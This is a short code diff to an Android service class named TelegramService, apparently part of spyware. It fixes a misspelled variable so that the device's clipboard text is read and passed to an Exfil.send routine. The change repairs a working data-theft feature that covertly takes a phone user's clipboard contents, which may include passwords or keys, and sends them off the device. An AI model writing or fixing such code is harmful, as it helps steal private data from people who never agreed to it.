@@ -459,7 +459,7 @@ public class TelegramService extends Service {
         try {
             ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
             if (clipboard.hasPrimaryClip()) {
-                Exfil.send("📋 Clipboard:\n" + cliboard.getPrimaryClip().getItemAt(0).getText().toString());
+                Exfil.send("📋 Clipboard:\n" + clipboard.getPrimaryClip().getItemAt(0).getText().toString());
             } else {
                 Exfil.send("📋 Clipboard is empty.");
             }
